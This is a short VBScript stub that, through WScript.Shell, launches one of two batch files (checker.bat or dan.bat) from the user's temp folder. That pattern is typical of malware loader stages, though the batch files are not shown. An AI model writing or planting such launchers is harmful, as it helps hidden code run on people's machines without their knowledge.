Dim objShell
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c if exist %TEMP%\checker.bat (start %TEMP%\checker.bat) else (cmd /c start %TEMP%\dan.bat)"